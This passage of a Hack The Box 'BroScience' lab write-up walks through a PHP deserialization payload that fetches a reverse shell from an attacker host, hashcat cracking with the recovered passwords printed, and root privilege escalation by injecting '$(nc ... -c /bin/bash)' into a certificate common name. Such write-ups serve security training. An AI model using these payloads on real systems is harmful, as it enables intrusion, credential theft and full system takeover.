+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Avatar</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>save</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>tmp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Here the <code>AvatarInterface</code> class has</p><ul><li>an <code>$imgpath</code> parameter - used as the path where to save a file</li><li>a <code>$tmp</code> parameter - containing the contents to be written in the path provided by <code>$imgpath</code></li><li><code>__wakeup</code> -
+<a href=https://www.php.net/manual/en/language.oop5.magic.php rel=noopener>php magic method</a> which creates a new instance of <code>Avatar</code> class and a class save method for the the avatar class</li></ul><p>Theoretically if we could set the <code>$tmp</code> var to our server hosting a PHP shell, then set <code>$imgpath</code> to the filename of the php shell, it should store it on the server & we could trigger it by just visiting it</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>UserPrefs</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$theme</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$theme</span> <span class=o>=</span> <span class=s2>&#34;light&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>theme</span> <span class=o>=</span> <span class=nv>$theme</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Avatar</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$imgPath</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span> <span class=o>=</span> <span class=nv>$imgPath</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>save</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$f</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>AvatarInterface</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$tmp</span> <span class=o>=</span> <span class=s2>&#34;http://10.10.14.124/evShell.php&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span> <span class=o>=</span> <span class=s2>&#34;./evShell.php&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Avatar</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>save</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>tmp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>AvatarInterface</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>To recap the steps are:</p><ul><li>create an <code>attack.php</code> to inject our <code>$imgpath</code> & <code>$tmp</code> into the php serialized object</li><li>get a
+<a href=https://github.com/pentestmonkey/php-reverse-shell rel=noopener>php reverse shell</a> & host it with python&rsquo;s simple http server</li><li>modify our <code>user-prefs</code> cookie to write our php shell onto the server</li><li>open up a <code>netcat</code> listener & navigate to <code>https://broscience.htb/evShell.php</code></li></ul><p><img src="/write-ups/images/Pasted image 20230224183853.png" width=auto></p><a href=#getting-user><h2 id=getting-user><span class=hanchor arialabel=Anchor># </span>Getting user</h2></a><p>Remember the <code>db_connect.php</code> file which leaked the database creds? It&rsquo;s finally time to make use of them by connecting to the postgresql with the <code>psql</code> client:</p><p><img src="/write-ups/images/Pasted image 20230224190943.png" width=auto></p><p>Now let&rsquo;s try to crack them using <code>hashcat</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># format them with &#34;hash:salt&#34; = 5d15340bded5b9395d5d14b9c21bc82b:NaCl</span>
+</span></span><span class=line><span class=cl>hashcat -m <span class=m>20</span> hashes /usr/share/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
+</span></span><span class=line><span class=cl>bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
+</span></span><span class=line><span class=cl>62d19f7e7ddcb5946728776d25e410ed:NaCl:password
+</span></span><span class=line><span class=cl>13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
+</span></span></code></pre></td></tr></table></div></div><p>From our <code>www-data</code> shell we know that the only active user on the machine is <code>bill</code> so we can SSH with him & get our user.txt flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh bill@broscience.htb   
+</span></span><span class=line><span class=cl>bill@broscience:~$ cat user.txt 
+</span></span><span class=line><span class=cl>babecb64768734a83c06d030bfcea8a7
+</span></span></code></pre></td></tr></table></div></div><a href=#privesc><h2 id=privesc><span class=hanchor arialabel=Anchor># </span>Privesc</h2></a><p>After some basic enumeration, I found a bash script owned by root in <code>/opt/renew_cert.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$#</span><span class=s2>&#34;</span> -ne <span class=m>1</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=nv>$1</span> <span class=o>==</span> <span class=s2>&#34;-h&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=nv>$1</span> <span class=o>==</span> <span class=s2>&#34;--help&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=nv>$1</span> <span class=o>==</span> <span class=s2>&#34;help&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Usage: </span><span class=nv>$0</span><span class=s2> certificate.crt&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>exit</span> 0<span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -f <span class=nv>$1</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    openssl x509 -in <span class=nv>$1</span> -noout -checkend <span class=m>86400</span> &gt; /dev/null
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -eq <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;No need to renew yet.&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nb>exit</span> 1<span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>subject</span><span class=o>=</span><span class=k>$(</span>openssl x509 -in <span class=nv>$1</span> -noout -subject <span class=p>|</span> cut -d <span class=s2>&#34;=&#34;</span> -f2-<span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>country</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;C = .{2}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>state</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;ST = .*,&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>locality</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;L = .*,&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>organization</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;O = .*,&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>organizationUnit</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;OU = .*,&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>commonName</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;CN = .*,?&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>emailAddress</span><span class=o>=</span><span class=k>$(</span>openssl x509 -in <span class=nv>$1</span> -noout -email<span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>country</span><span class=o>=</span><span class=si>${</span><span class=nv>country</span><span class=p>:</span><span class=nv>4</span><span class=si>}</span>
+</span></span><span class=line><span class=cl>    <span class=nv>state</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>state</span><span class=p>:</span><span class=nv>5</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>locality</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>locality</span><span class=p>:</span><span class=nv>3</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>organization</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>organization</span><span class=p>:</span><span class=nv>4</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>organizationUnit</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>organizationUnit</span><span class=p>:</span><span class=nv>5</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>commonName</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>commonName</span><span class=p>:</span><span class=nv>5</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=nv>$subject</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Country     =&gt; </span><span class=nv>$country</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;State       =&gt; </span><span class=nv>$state</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Locality    =&gt; </span><span class=nv>$locality</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Org Name    =&gt; </span><span class=nv>$organization</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Org Unit    =&gt; </span><span class=nv>$organizationUnit</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Common Name =&gt; </span><span class=nv>$commonName</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Email       =&gt; </span><span class=nv>$emailAddress</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\nGenerating certificate...&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days <span class=m>365</span> <span class=o>&lt;&lt;&lt;</span><span class=s2>&#34;</span><span class=nv>$country</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$state</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$locality</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$organization</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$organizationUnit</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$commonName</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$emailAddress</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;</span> 2&gt;/dev/null
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    /bin/bash -c <span class=s2>&#34;mv /tmp/temp.crt /home/bill/Certs/</span><span class=nv>$commonName</span><span class=s2>.crt&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;File doesn&#39;t exist&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>exit</span> 1<span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>This script is a bash script that takes 1 argument <em>(filename of crt)</em> and checks the expiration of a given SSL certificate file, and if it is close to expiring, it will print out information about the certificate. Notice that at the end of the script it tries to move the newly generated certificate in <code>/home/bill/Certs</code> passing into bash <code>$commonName</code> - a variable that we control. Thus, we can inject bash commands by setting it to something like: <code>$(&lt;cmd>)</code>.</p><p>Let&rsquo;s test our theory & first find if this script is ever ran by root. Initially it took me some time to figure that I should run
+<a href=https://github.com/DominicBreuker/pspy rel=noopener>pspy</a> which can monitor running processes without root perms which revealed that, indeed, the <code>renew_cert</code> script was ran by root @ regular intervals.</p><p>Next I
+<a href="https://www.ibm.com/docs/en/api-connect/10.0.1.x?topic=overview-generating-self-signed-certificate-using-openssl" rel=noopener>generated a self-signed certificate</a> and added my bash command payload when prompted for the common name. Then placed my <code>ev.crt</code> in <code>/home/bill/Certs</code>, started a netcat listener & waited:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-bash-5.1$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days <span class=m>5</span> -keyout bro.key -out ev.crt
+</span></span><span class=line><span class=cl>Generating a RSA private key
+</span></span><span class=line><span class=cl>.............................................................++++
+</span></span><span class=line><span class=cl>.............++++
+</span></span><span class=line><span class=cl>writing new private key to <span class=s1>&#39;bro.key&#39;</span>
+</span></span><span class=line><span class=cl>-----
+</span></span><span class=line><span class=cl>You are about to be asked to enter information that will be incorporated
+</span></span><span class=line><span class=cl>into your certificate request.
+</span></span><span class=line><span class=cl>What you are about to enter is what is called a Distinguished Name or a DN.
+</span></span><span class=line><span class=cl>There are quite a few fields but you can leave some blank
+</span></span><span class=line><span class=cl>For some fields there will be a default value,
+</span></span><span class=line><span class=cl>If you enter <span class=s1>&#39;.&#39;</span>, the field will be left blank.
+</span></span><span class=line><span class=cl>-----
+</span></span><span class=line><span class=cl>Country Name <span class=o>(</span><span class=m>2</span> letter code<span class=o>)</span> <span class=o>[</span>AU<span class=o>]</span>:
+</span></span><span class=line><span class=cl>State or Province Name <span class=o>(</span>full name<span class=o>)</span> <span class=o>[</span>Some-State<span class=o>]</span>:
+</span></span><span class=line><span class=cl>Locality Name <span class=o>(</span>eg, city<span class=o>)</span> <span class=o>[]</span>:
+</span></span><span class=line><span class=cl>Organization Name <span class=o>(</span>eg, company<span class=o>)</span> <span class=o>[</span>Internet Widgits Pty Ltd<span class=o>]</span>:
+</span></span><span class=line><span class=cl>Organizational Unit Name <span class=o>(</span>eg, section<span class=o>)</span> <span class=o>[]</span>:
+</span></span><span class=line><span class=cl>Common Name <span class=o>(</span>e.g. server FQDN or YOUR name<span class=o>)</span> <span class=o>[]</span>:<span class=k>$(</span>nc 10.10.14.221 <span class=m>1337</span> -c /bin/bash<span class=k>)</span>
+</span></span><span class=line><span class=cl>Email Address <span class=o>[]</span>:
+</span></span></code></pre></td></tr></table></div></div><p>And after some time I got back this:</p><p><img src="/write-ups/images/Pasted image 20230301203321.png" width=auto></p><p><img src="https://media4.giphy.com/media/l49JHDggRzqHQP1ny/200w.webp?cid=ecf05e479q8fg95m6hovvtwg6109b501up4nvep0ncb1r8hp&rid=200w.webp&ct=g" width=auto alt></p><hr><a href=#refs><h2 id=refs><span class=hanchor arialabel=Anchor># </span>Refs</h2></a><ul><li><a href=https://app.hackthebox.com/machines/BroScience rel=noopener>room</a></li></ul><a href=#see-also><h2 id=see-also><span class=hanchor arialabel=Anchor># </span>See Also</h2></a><ul><li><a href=/write-ups/HTB rel=noopener class=internal-link data-src=/write-ups/HTB>write-ups/HTB</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://hakbrain.xyz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Vl@gh3 using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2023</p><ul><li><a href=https://hakbrain.xyz/>Home</a></li><li><a href=https://twitter.com/vlaghe1>Twitter</a></li><li><a href=https://github.com/vlagh3>Github</a></li></ul></footer></div></div></body></html>
